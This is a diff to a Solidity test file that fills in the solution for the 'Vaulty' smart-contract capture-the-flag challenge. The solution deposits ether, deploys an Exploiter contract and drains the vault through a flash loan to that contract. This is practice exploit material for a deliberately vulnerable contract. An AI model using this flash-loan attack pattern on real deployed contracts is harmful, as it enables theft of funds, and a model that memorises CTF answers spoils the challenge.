@@ -9,8 +9,7 @@ import {IVaulty} from "src/romeroadrian-vaulty/interfaces/IVaulty.sol";
 // Import dependencies for your solution here! //
 //             (if you need any)               //
 ///////////////////////////////////////////////*/
-
-
+import {Exploiter} from "test/romeroadrian-vaulty/Exploiter.sol";
 
 contract VaultyTest is Test, VaultyDeployer {
     IVaulty public vaulty;
@@ -22,7 +21,6 @@ contract VaultyTest is Test, VaultyDeployer {
 
     /// @notice Deploy the ExampleCTF and the solution contract
     function setUp() public override(VaultyDeployer) {
-
         VaultyDeployer.setUp();
 
         vm.deal(alice, 15 ether);
@@ -48,6 +46,7 @@ contract VaultyTest is Test, VaultyDeployer {
         /*//////////////////////////////////////
         //     Write your solution here       //
         //////////////////////////////////////*/
+        vaulty.deposit{value: 15 ether}();
         vm.stopPrank();
 
         vm.startPrank(alice);
@@ -58,6 +57,10 @@ contract VaultyTest is Test, VaultyDeployer {
         /*//////////////////////////////////////
         //     Write your solution here       //
         //////////////////////////////////////*/
+        // Exploiter exploiter = new Exploiter(address(vaulty));
+        address exploiter = vyperDeployer.deployContract("test/romeroadrian-vaulty/", "Exploiter");
+        vaulty.flashLoan(address(exploiter), 30 ether);
+        // exploiter.withdraw();
         vm.stopPrank();
 
         assertTrue(vaulty.isSolved());
